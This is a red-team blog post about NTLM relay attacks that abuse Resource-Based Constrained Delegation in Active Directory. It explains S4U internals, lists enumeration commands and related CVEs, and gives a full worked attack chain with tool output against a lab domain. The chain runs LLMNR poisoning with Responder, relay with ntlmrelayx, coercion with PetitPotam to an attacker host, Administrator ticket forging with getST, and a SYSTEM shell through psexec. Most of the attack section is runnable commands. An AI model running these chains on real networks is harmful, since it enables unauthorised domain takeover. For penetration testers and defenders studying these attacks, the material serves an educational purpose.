---
title: "NTLM Relay to RBCD & Shadow Credentials - Advanced Attack Scenarios Deep Dive"
date: 2026-03-23 17:00:00 +0200
categories: [Active Directory, NTLM Relay Attacks]
tags: [ntlm-relay, rbcd, resource-based-constrained-delegation, shadow-credentials, s4u2self, s4u2proxy, kerberos, active-directory, red-team, penetration-testing]
description: "An advanced deep dive into NTLM relay attacks targeting RBCD and Shadow Credentials. Covers 12 attack scenarios including quota=0 bypasses, CVE exploits, and comprehensive tooling from both Linux and Windows attack machines."
image:
  path: /assets/img/posts/rbcd-attack-banner.png
  alt: NTLM Relay to RBCD Attack Flow
pin: true
---

## Introduction

Active Directory environments remain one of the most targeted infrastructures in modern networks, and among the most devastating attack primitives available to adversaries is **Resource-Based Constrained Delegation (RBCD)** abuse combined with **NTLM relay attacks**. This post is an advanced, comprehensive deep dive covering 12 attack scenarios, related CVEs, tooling from both Linux and Windows attack platforms, and the inner workings of the Kerberos delegation mechanisms that make these attacks possible.

Whether you are a red teamer, penetration tester, or blue team defender, understanding these attack paths is critical. We will go from the theory behind S4U extensions all the way through to full exploitation chains, including edge cases like `MachineAccountQuota = 0` bypasses, the Bronze Bit attack, and cross-domain RBCD abuse.

> **Lab Environment:** All examples use the `INLANEFREIGHT.LOCAL` domain with IPs in the `172.16.117.x` range. Domain Controller: `DC01.INLANEFREIGHT.LOCAL` (`172.16.117.3`). Target: `WS01.INLANEFREIGHT.LOCAL` (`172.16.117.20`). Attacker: `172.16.117.100`.
{: .prompt-info }

---

### What is RBCD (Resource-Based Constrained Delegation)?

**Resource-Based Constrained Delegation** is a delegation model introduced with Windows Server 2012 that flips the traditional constrained delegation model. Instead of the front-end service specifying which back-end services it can delegate to (via `msDS-AllowedToDelegateTo`), the **back-end service** (the resource) specifies which front-end services are **allowed to delegate to it** via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

This is a critical distinction:

| Feature | Traditional Constrained Delegation | Resource-Based Constrained Delegation |
|---|---|---|
| **Configured on** | Front-end service (the delegating account) | Back-end service (the target resource) |
| **Attribute** | `msDS-AllowedToDelegateTo` | `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| **Requires** | Domain Admin to configure | Write access to the target object |
| **SPN requirement** | Must specify target SPNs | Only needs the SID of the delegating account |
| **Protocol Transition** | Configurable (Kerberos Only / Any Auth Protocol) | Always uses Protocol Transition (S4U2Self) |
| **Introduced** | Windows Server 2003 | Windows Server 2012 |

### The msDS-AllowedToActOnBehalfOfOtherIdentity Attribute

This attribute stores a security descriptor (in `SDDL` format or raw binary) that contains a list of **SIDs** of accounts that are allowed to delegate to the resource. When the KDC processes an `S4U2Proxy` request targeting this resource, it checks whether the requesting service's SID appears in this attribute.

The key insight that makes RBCD dangerous is:

1. **Computer objects can edit their own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute** — meaning if you relay a machine account's authentication to LDAP, you can set RBCD on that machine.
2. **Any domain user can create machine accounts** by default — the `MachineAccountQuota` (MAQ) attribute defaults to **10**, meaning a standard user can add up to 10 computer accounts.
3. **No Domain Admin privileges are required** — unlike traditional constrained delegation, anyone with write access to a computer object can configure RBCD.

### How S4U2Self and S4U2Proxy Work Together

The S4U (Service-for-User) Kerberos extensions are the backbone of all delegation attacks:

**S4U2Self** — Allows a service to obtain a service ticket **to itself** on behalf of any user. This is used when the user did not authenticate via Kerberos (e.g., they used NTLM, forms authentication, etc.). The resulting ticket may or may not be **forwardable** depending on configuration.

**S4U2Proxy** — Allows a service to use a service ticket (obtained from S4U2Self or from the user's actual Kerberos authentication) to request a **new service ticket** to a back-end service on behalf of that user.

The flow for RBCD abuse is:

```
Attacker (controlling Account A)
    |
    |--- S4U2Self ---> KDC: "Give me a ticket to myself as Administrator"
    |                   KDC returns: ST(Administrator -> Account A)
    |
    |--- S4U2Proxy --> KDC: "Use this ticket to get me a ticket to Target B as Administrator"
    |                   KDC checks: Is Account A's SID in Target B's
    |                   msDS-AllowedToActOnBehalfOfOtherIdentity?
    |                   YES -> Returns: ST(Administrator -> Target B)
    |
    |--- Pass-the-Ticket --> Access Target B as Administrator
```

### Why RBCD Is Dangerous

The attack is devastating because of the following chain of defaults in Active Directory:

1. **MachineAccountQuota = 10** — Any authenticated domain user can create machine accounts
2. **Computer objects control their own RBCD attribute** — Relaying a machine's NTLM authentication allows writing to its RBCD attribute
3. **LDAP signing is not enforced by default** — Allows NTLM relay to LDAP/LDAPS
4. **SMB signing is not enforced on workstations** — Allows coercion and relay of machine account authentication
5. **The WebClient service** — When enabled, allows HTTP-based coercion that can be relayed to LDAP (since HTTP does not negotiate signing)

> RBCD was introduced in Windows Server 2012 and requires a Domain Controller Functional Level (DCFL) of 2012 or higher. If your target domain is still at 2008 R2 DCFL, RBCD attacks will not work.
{: .prompt-warning }

---

## RBCD Internals — How It Works Under the Hood

Understanding the internals is crucial for both exploitation and detection. Let's break down each step of the S4U exchange.

### S4U2Self Request — Detailed

When a service (Account A) wants to obtain a service ticket to itself on behalf of a user:

1. **Account A authenticates to the KDC** and presents its TGT
2. **Account A sends a `TGS-REQ`** with the `PA-FOR-USER` padata containing the target user's identity (e.g., `Administrator`)
3. **The KDC validates** the request:
   - Is Account A's TGT valid?
   - Does Account A have an SPN set? (Required for traditional S4U2Self, but U2U can bypass this)
4. **The KDC issues a service ticket** to Account A on behalf of the specified user

**Forwardable Flag Logic:**

| Condition | Forwardable? |
|---|---|
| Account A has `TrustedToAuthForDelegation` (Protocol Transition) set | ✅ Yes |
| Account A does NOT have `TrustedToAuthForDelegation` | ❌ No |
| Target user is in `Protected Users` group | ❌ No |
| Target user has "Account is sensitive and cannot be delegated" | ❌ No |

> For RBCD, the `Forwardable` flag on the S4U2Self ticket **does not matter**. Unlike traditional constrained delegation, the KDC does not require a forwardable ticket for S4U2Proxy when RBCD is configured on the target. This is a fundamental difference.
{: .prompt-tip }

### S4U2Proxy Request — Detailed

After obtaining the S4U2Self ticket:

1. **Account A sends another `TGS-REQ`** to the KDC, this time for the target service (e.g., `cifs/TargetB`)
2. **The request includes** the S4U2Self ticket as an `additional-ticket`
3. **The KDC processes the request**:
   - For **traditional constrained delegation**: Checks `msDS-AllowedToDelegateTo` on Account A and verifies the ticket is `Forwardable`
   - For **RBCD**: Checks `msDS-AllowedToActOnBehalfOfOtherIdentity` on Target B for Account A's SID — **does NOT require Forwardable**
4. **The KDC returns a service ticket** to Target B on behalf of the impersonated user

### The Forwardable Flag and Its Role

The `Forwardable` flag in a Kerberos ticket indicates whether the ticket can be forwarded to another service. In the context of delegation:

- **Traditional Constrained Delegation (Kerberos Only)**: The S4U2Proxy request **requires** a forwardable ticket. If the ticket is not forwardable, the request fails.
- **Traditional Constrained Delegation (Protocol Transition / Any Auth)**: S4U2Self produces a forwardable ticket (unless the user is protected), and S4U2Proxy succeeds.
- **RBCD**: The KDC **does not enforce** the forwardable requirement on the evidence ticket. This is what makes RBCD so powerful — even non-forwardable tickets from S4U2Self work.

However, there is a nuance: If the impersonated user is a member of `Protected Users` or has the "sensitive and cannot be delegated" flag, the S4U2Self ticket will be non-forwardable AND the KDC may refuse the S4U2Proxy for RBCD as well. The **Bronze Bit (CVE-2020-17049)** attack can bypass this.

### Protocol Transition vs. Kerberos Only

| Mode | S4U2Self Ticket | S4U2Proxy Requirement |
|---|---|---|
| **Kerberos Only** | Non-forwardable | Requires forwardable evidence ticket (fails with S4U2Self) |
| **Protocol Transition (Any Auth)** | Forwardable | Works with the forwardable S4U2Self ticket |
| **RBCD** | May or may not be forwardable | Does NOT require forwardable — always works (unless user is protected) |

### Visual Flow

```
┌──────────┐      ┌──────────────┐      ┌──────────────┐      ┌──────────────┐
│  Attacker │      │   Account A  │      │     KDC      │      │   Target B   │
│  (hacker) │      │ (FAKEMACHINE$│      │  (DC01)      │      │  (WS01)      │
└─────┬─────┘      └──────┬───────┘      └──────┬───────┘      └──────┬───────┘
      │                   │                      │                     │
      │  1. Create A &    │                      │                     │
      │  set RBCD on B    │                      │                     │
      │──────────────────>│                      │                     │
      │                   │  2. TGS-REQ          │                     │
      │                   │  (S4U2Self for Admin) │                     │
      │                   │─────────────────────>│                     │
      │                   │                      │                     │
      │                   │  3. TGS-REP          │                     │
      │                   │  ST(Admin -> A)      │                     │
      │                   │<─────────────────────│                     │
      │                   │                      │                     │
      │                   │  4. TGS-REQ          │                     │
      │                   │  (S4U2Proxy for B)   │                     │
      │                   │─────────────────────>│                     │
      │                   │                      │  KDC checks RBCD    │
      │                   │                      │  attribute on B     │
      │                   │  5. TGS-REP          │                     │
      │                   │  ST(Admin -> B)      │                     │
      │                   │<─────────────────────│                     │
      │                   │                      │                     │
      │  6. Pass-the-Ticket                      │                     │
      │  Access B as Admin│                      │                     │
      │──────────────────────────────────────────────────────────────>│
      │                   │                      │                     │
```

### What Accounts Can Be Used for Delegation

For the S4U2Self + S4U2Proxy chain to work, the controlled account (Account A) must be recognizable as a "service" by Kerberos:

| Account Type | S4U2Self Works? | Notes |
|---|---|---|
| **Computer account** (ends with `$`) | ✅ Yes | Most common — create via MAQ |
| **User account with SPN** | ✅ Yes | Any user with `servicePrincipalName` set |
| **User account without SPN** | ⚠️ With U2U | Requires SPN-less RBCD technique (James Forshaw, 2022) |
| **gMSA account** | ✅ Yes | If you can read its password |

---

## Prerequisites and Enumeration

Before launching any RBCD attack, you need to enumerate several key configurations. Here are all the checks, from both Linux and Windows.

### MachineAccountQuota (MAQ) Check

The `ms-DS-MachineAccountQuota` attribute determines how many computer accounts a regular user can create. Default is **10**.

**Linux — netexec (nxc):**

```bash
hacker@root[/root]$ nxc ldap 172.16.117.3 -u 'svc_web' -p 'Password123' -M maq
SMB         172.16.117.3    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\svc_web:Password123
MAQ         172.16.117.3    389    DC01             [*] Getting the MachineAccountQuota
MAQ         172.16.117.3    389    DC01             MachineAccountQuota: 10
```

**Linux — ldapsearch:**

```bash
hacker@root[/root]$ ldapsearch -x -H ldap://172.16.117.3 -D "svc_web@INLANEFREIGHT.LOCAL" -w 'Password123' -b "DC=INLANEFREIGHT,DC=LOCAL" "(objectClass=domain)" ms-DS-MachineAccountQuota
# INLANEFREIGHT.LOCAL
dn: DC=INLANEFREIGHT,DC=LOCAL
ms-DS-MachineAccountQuota: 10
```

**Linux — bloodyAD:**

```bash
hacker@root[/root]$ bloodyAD -d INLANEFREIGHT.LOCAL -u 'svc_web' -p 'Password123' --host 172.16.117.3 get object 'DC=INLANEFREIGHT,DC=LOCAL' --attr ms-DS-MachineAccountQuota
distinguishedName: DC=INLANEFREIGHT,DC=LOCAL
ms-DS-MachineAccountQuota: 10
```

**Linux — ldeep:**

```bash
hacker@root[/root]$ ldeep ldap -u 'svc_web' -p 'Password123' -d INLANEFREIGHT.LOCAL -s ldap://172.16.117.3 search '(objectClass=domain)' ms-DS-MachineAccountQuota
[
  {
    "dn": "DC=INLANEFREIGHT,DC=LOCAL",
    "ms-DS-MachineAccountQuota": 10
  }
]
```

**Windows — PowerShell:**

```powershell
PS C:\Tools> Get-ADObject -Identity "DC=INLANEFREIGHT,DC=LOCAL" -Properties ms-DS-MachineAccountQuota

DistinguishedName          : DC=INLANEFREIGHT,DC=LOCAL
ms-DS-MachineAccountQuota  : 10
Name                       : INLANEFREIGHT
ObjectClass                : domainDNS
ObjectGuid                 : a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

### WebClient / WebDAV Service Check

The WebClient service (WebDAV) is essential for HTTP-based coercion. When enabled, it allows file access via the WebDAV protocol over HTTP, which does not negotiate SMB signing — making it perfect for NTLM relay to LDAP.

**Linux — netexec webclient module:**

```bash
hacker@root[/root]$ nxc smb 172.16.117.20 -u 'svc_web' -p 'Password123' -M webdav
SMB         172.16.117.20   445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.20   445    WS01             [+] INLANEFREIGHT.LOCAL\svc_web:Password123
WEBDAV      172.16.117.20   445    WS01             WebClient Service enabled: True
```

> If the WebClient service is not running, you can attempt to start it remotely using the **drop-sc** technique (search-connector file drop) or by hosting a file with a WebDAV icon that forces the service to start when a user browses the folder.
{: .prompt-tip }

### LDAP Signing Check

LDAP signing prevents relay attacks to LDAP. By default, it is **not enforced**.

**Linux — netexec:**

```bash
hacker@root[/root]$ nxc ldap 172.16.117.3 -u 'svc_web' -p 'Password123' -M ldap-checker
SMB         172.16.117.3    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\svc_web:Password123
LDAP-CHE... 172.16.117.3    389    DC01             LDAP Signing NOT Enforced!
LDAP-CHE... 172.16.117.3    389    DC01             LDAPS Channel Binding is set to "NEVER"
```

### SMB Signing Check

SMB signing prevents relay attacks between SMB sessions. By default, it is **enforced only on Domain Controllers**.

```bash
hacker@root[/root]$ nxc smb 172.16.117.0/24 --gen-relay-list targets.txt
SMB         172.16.117.3    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.20   445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.25   445    SRV01            [*] Windows Server 2019 Build 17763 x64 (name:SRV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)

hacker@root[/root]$ cat targets.txt
172.16.117.20
172.16.117.25
```

### Enumerate GenericWrite / GenericAll ACLs

These ACLs allow writing to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute without relaying.

**BloodHound — Cypher Query:**

```cypher
MATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer)
WHERE u.name =~ '(?i)svc_web@INLANEFREIGHT.LOCAL'
RETURN p
```

**PowerView (Windows):**

```powershell
PS C:\Tools> Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl" -and $_.ObjectType -match "Computer"} | Select-Object IdentityReferenceName, ActiveDirectoryRights, ObjectDN

IdentityReferenceName  ActiveDirectoryRights  ObjectDN
---------------------  ---------------------  --------
svc_web                GenericWrite           CN=WS01,OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL
svc_backup             GenericAll             CN=SRV01,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL
```

**Linux — ldapsearch (check specific ACL):**

```bash
hacker@root[/root]$ ldapsearch -x -H ldap://172.16.117.3 -D "svc_web@INLANEFREIGHT.LOCAL" -w 'Password123' -b "CN=WS01,OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL" "(objectClass=computer)" nTSecurityDescriptor
```

### Check for Protected Users Group Membership

Users in the `Protected Users` group cannot be impersonated via delegation (unless you use Bronze Bit).

```bash
hacker@root[/root]$ nxc ldap 172.16.117.3 -u 'svc_web' -p 'Password123' --groups "Protected Users"
SMB         172.16.117.3    445    DC01             [*] Windows Server 2019 Build 17763 x64
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\svc_web:Password123
LDAP        172.16.117.3    389    DC01             [*] Group: Protected Users
LDAP        172.16.117.3    389    DC01             Members:
LDAP        172.16.117.3    389    DC01             - krbtgt
LDAP        172.16.117.3    389    DC01             - Administrator
```

---

## Related CVEs

The following CVEs are directly relevant to NTLM relay and RBCD attack chains:

### CVE-2019-1040 — Drop the MIC

| Field | Details |
|---|---|
| **CVE** | CVE-2019-1040 |
| **Name** | Drop the MIC |
| **Severity** | Critical |
| **Impact** | Bypass NTLM Message Integrity Code (MIC), relay SMB to LDAP |
| **Description** | Allows an attacker to modify NTLM authentication messages by removing the MIC field, bypassing integrity checks. This enables relaying SMB authentication (which normally negotiates signing) to LDAP. The attacker unsets `NTLMSSP_NEGOTIATE_SIGN`, `NTLMSSP_NEGOTIATE_ALWAYS_SIGN`, `NEGOTIATE_KEY_EXCHANGE`, and `NEGOTIATE_VERSION` flags. |
| **Exploitation** | `ntlmrelayx.py --remove-mic -t ldap://DC --delegate-access` combined with PetitPotam or PrinterBug coercion |
| **Patched** | June 2019 |

### CVE-2019-1166 — Drop the MIC 2

| Field | Details |
|---|---|
| **CVE** | CVE-2019-1166 |
| **Name** | Drop the MIC 2 (Second MIC Bypass) |
| **Severity** | Important |
| **Impact** | Second bypass of the NTLM MIC protection |
| **Description** | After the initial CVE-2019-1040 patch, researchers discovered that the MIC could still be bypassed through a different manipulation of the NTLM negotiation flags. This was a patch bypass for the original Drop the MIC vulnerability. |
| **Exploitation** | Similar to CVE-2019-1040, using modified ntlmrelayx with MIC removal techniques |
| **Patched** | October 2019 |

### CVE-2019-1338 — MIC Bypass + LMv2

| Field | Details |
|---|---|
| **CVE** | CVE-2019-1338 |
| **Name** | MIC Bypass via LMv2 Response |
| **Severity** | Important |
| **Impact** | Bypass MIC protection by including LMv2 response |
| **Description** | When an NTLM authentication message includes an LMv2 response, certain versions of Windows fail to properly validate the MIC. This allows the same relay attacks as CVE-2019-1040 through a different code path. Affects systems where LM authentication is not explicitly disabled. |
| **Exploitation** | Force LMv2 authentication + relay with MIC removal |
| **Patched** | October 2019 |

### CVE-2019-1019 — NTLM Session Signing Bypass via NETLOGON

| Field | Details |
|---|---|
| **CVE** | CVE-2019-1019 |
| **Name** | NTLM Session Signing Bypass via NETLOGON |
| **Severity** | Important |
| **Impact** | Bypass session signing through the NETLOGON secure channel |
| **Description** | An attacker can exploit the NETLOGON secure channel to bypass NTLM session signing requirements, allowing replay and relay of NTLM authentication in scenarios where signing would normally prevent it. |
| **Exploitation** | Relay via NETLOGON channel to avoid signing enforcement |
| **Patched** | June 2019 |

### CVE-2020-17049 — Bronze Bit

| Field | Details |
|---|---|
| **CVE** | CVE-2020-17049 |
| **Name** | Bronze Bit Attack |
| **Severity** | Critical |
| **Impact** | Bypass forwardable flag, bypass Protected Users delegation protection |
| **Description** | The `Forwardable` flag in a Kerberos service ticket is encrypted only with the service account's long-term key — it is NOT in the signed PAC. An attacker who knows a service account's hash can decrypt the ticket, flip the forwardable bit to 1, and re-encrypt it. This bypasses: (1) Protected Users group protection against delegation, (2) "Account is sensitive and cannot be delegated" flag, and (3) Kerberos Only constrained delegation mode. |
| **Exploitation** | `getST.py -force-forwardable` or `Rubeus s4u /bronzebit` |
| **Patched** | December 2020 (multiple patches, defense-in-depth) |

### CVE-2021-42278 — sAMAccountName Spoofing (noPac Prerequisite)

| Field | Details |
|---|---|
| **CVE** | CVE-2021-42278 |
| **Name** | sAMAccountName Spoofing |
| **Severity** | Critical (when combined with CVE-2021-42287) |
| **Impact** | Rename machine accounts to impersonate Domain Controllers |
| **Description** | Computer account names should end with `$` in their `sAMAccountName`, but Active Directory does not enforce this. An attacker can rename a machine account to match a Domain Controller's name without the trailing `$`, then request a TGT. After renaming back, the KDC confuses the account with the DC. |
| **Exploitation** | Rename computer account `sAMAccountName` → DC name without `$`, request TGT, rename back, use TGT for S4U2Self |
| **Patched** | November 2021 |

### CVE-2021-42287 — KDC S4U2Self Confusion (noPac)

| Field | Details |
|---|---|
| **CVE** | CVE-2021-42287 |
| **Name** | KDC S4U2Self PAC Confusion |
| **Severity** | Critical (when combined with CVE-2021-42278) |
| **Impact** | Domain user to Domain Admin in seconds |
| **Description** | When a TGT is presented for S4U2Self and the account name no longer exists, the KDC automatically appends `$` and searches again. Combined with CVE-2021-42278, an attacker can obtain a TGT as "DC01" (the renamed machine account), delete/rename the account, then use the TGT for S4U2Self — the KDC finds "DC01$" (the real DC) and issues a service ticket for the DC machine account. |
| **Exploitation** | `noPac.py` / `sam-the-admin.py` automated tools |
| **Patched** | November 2021 |

### CVE-2022-26923 — Certifried (AD CS Machine Account Certificate Spoofing)

| Field | Details |
|---|---|
| **CVE** | CVE-2022-26923 |
| **Name** | Certifried |
| **Severity** | Critical |
| **Impact** | Domain escalation via AD CS certificate enrollment |
| **Description** | When a machine account enrolls for a certificate using the default `Machine` template, the certificate's identity is based on the `dNSHostName` attribute. An attacker who creates a new machine account (via MAQ) can set its `dNSHostName` to match a Domain Controller's, enroll for a certificate, and use it for PKINIT authentication as the DC. |
| **Exploitation** | Create machine → Set dNSHostName to DC → Enroll certificate → PKINIT as DC → DCSync |
| **Patched** | May 2022 |

### CVE-2021-36942 — PetitPotam (Unauthenticated Coercion)

| Field | Details |
|---|---|
| **CVE** | CVE-2021-36942 |
| **Name** | PetitPotam (Unauthenticated) |
| **Severity** | Critical |
| **Impact** | Force Domain Controller NTLM authentication without credentials |
| **Description** | The Encrypting File System Remote (EFSRPC) protocol can be abused to coerce a Domain Controller (or any Windows machine) into authenticating to an attacker-controlled host via NTLM. The initial version worked without authentication, making it especially dangerous for NTLM relay chains. |
| **Exploitation** | `PetitPotam.py -u '' -p '' DC_IP ATTACKER_IP` → relay to LDAP/AD CS |
| **Patched** | August 2021 (unauthenticated vector); authenticated vectors remain |

### CVE-2022-26925 — Windows LSA Spoofing (PetitPotam Variant)

| Field | Details |
|---|---|
| **CVE** | CVE-2022-26925 |
| **Name** | Windows LSA Spoofing |
| **Severity** | Critical (CVSS 8.1, 9.8 when combined with relay) |
| **Impact** | Variant of PetitPotam; forces NTLM authentication from DC |
| **Description** | An unauthenticated attacker can coerce the Domain Controller to authenticate via NTLM by calling the LSARPC interface. This is a variant of the PetitPotam attack that was not fully addressed by the original patch, leveraging different LSARPC methods. |
| **Exploitation** | Coerce DC authentication → relay to AD CS HTTP enrollment endpoint or LDAP |
| **Patched** | May 2022 |

> Many of these CVEs can be **chained together** for devastating effects. For example: PetitPotam (CVE-2021-36942) for coercion + Drop the MIC (CVE-2019-1040) for relay bypass + RBCD write via LDAP + Bronze Bit (CVE-2020-17049) to bypass Protected Users.
{: .prompt-danger }

---

## Attack Scenarios

### Scenario 1: Classic RBCD via NTLM Relay to LDAP (WebDAV Coercion)

**Prerequisites:**
- WebClient service enabled on the target
- LDAP signing not enforced on the Domain Controller
- MachineAccountQuota > 0 (default = 10)
- Network access from the attacker to the target and DC

> This is the most common RBCD relay attack. We coerce a target machine to authenticate via HTTP (WebDAV), relay the authentication to LDAP on the DC, create a machine account, and set RBCD.
{: .prompt-info }

**Step 1: Enable WebClient via SearchConnector Drop**

If the WebClient service is not running on the target, we can use the `drop-sc` netexec module to drop a SearchConnector file that triggers the service to start:

```bash
hacker@root[/root]$ nxc smb 172.16.117.20 -u 'svc_web' -p 'Password123' -M drop-sc
SMB         172.16.117.20   445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.20   445    WS01             [+] INLANEFREIGHT.LOCAL\svc_web:Password123 
DROP-SC     172.16.117.20   445    WS01             [+] Created search connector file on \\WS01\Users\Public\Documents\
DROP-SC     172.16.117.20   445    WS01             [+] WebClient service should start on next user interaction
```

**Step 2: Start Responder with SMB and HTTP Off**

We need Responder running to handle DNS resolution, but with SMB and HTTP servers **disabled** since ntlmrelayx will handle those:

```bash
hacker@root[/root]$ sudo responder -I ens224 -dPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Listening for events...
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
```

**Step 3: Start ntlmrelayx with Delegate Access**

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -t ldaps://172.16.117.3 --delegate-access --escalate-user 'FAKEMACHINE$' -smb2support
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

> The `--delegate-access` flag tells ntlmrelayx to automatically create a new machine account (if one doesn't exist) and configure RBCD on the relayed target. The `--escalate-user` flag allows specifying a specific account to use for the delegation.
{: .prompt-tip }

**Step 4: Trigger Coercion with PetitPotam (WebDAV Format)**

We use PetitPotam in WebDAV format (using `@80/` to force WebDAV/HTTP instead of SMB):

```bash
hacker@root[/root]$ python3 PetitPotam.py -u 'svc_web' -p 'Password123' -d INLANEFREIGHT.LOCAL 172.16.117.100@80/test 172.16.117.20
              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elaborete_ch's Printerbug

Trying pipe lsarpc
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[+] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

**Step 5: ntlmrelayx Relays to LDAPS and Sets RBCD**

Back on the ntlmrelayx terminal:

```bash
[*] HTTPD(80): Connection from 172.16.117.20 controlled, attacking target ldaps://172.16.117.3
[*] HTTPD(80): Authenticating against ldaps://172.16.117.3 as INLANEFREIGHT/WS01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD(80): Connection from 172.16.117.20 controlled, attacking target ldaps://172.16.117.3
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Adding new computer with username: FAKEMACHINE$ and password: @Zw5Q#k8pL!nT3vR result: OK
[*] Delegation rights modified successfully! FAKEMACHINE$ can now impersonate users on WS01$ via S4U2Proxy
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Computer FAKEMACHINE$ already exists. Skipping...
```

**Step 6: Use getST.py to Get Service Ticket (S4U2Self + S4U2Proxy)**

```bash
hacker@root[/root]$ getST.py -spn 'cifs/WS01.INLANEFREIGHT.LOCAL' -impersonate Administrator -dc-ip 172.16.117.3 'INLANEFREIGHT.LOCAL/FAKEMACHINE$:@Zw5Q#k8pL!nT3vR'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
```

**Step 7: Pass-the-Ticket with psexec.py**

```bash
hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache

hacker@root[/root]$ psexec.py -k -no-pass WS01.INLANEFREIGHT.LOCAL
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Requesting shares on WS01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file xKjVNqBn.exe
[*] Opening SVCManager on WS01.INLANEFREIGHT.LOCAL.....
[*] Creating service nRhg on WS01.INLANEFREIGHT.LOCAL.....
[*] Starting service nRhg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
WS01
```

> **Success!** We now have SYSTEM access on WS01 by relaying its machine account authentication to LDAP, setting RBCD, and abusing the S4U2Self + S4U2Proxy chain to impersonate Administrator.
{: .prompt-tip }

---

### Scenario 2: RBCD via GenericWrite/GenericAll ACL Abuse

**Prerequisites:**
- A user account with `GenericWrite`, `GenericAll`, `WriteDacl`, or `WriteOwner` permissions over a target computer object
- MachineAccountQuota > 0 (or control of an existing computer/SPN account)
- No relay needed — this is a direct ACL abuse

> This scenario does not require NTLM relay. If you compromise a user with write access to a computer object's properties, you can directly set the RBCD attribute.
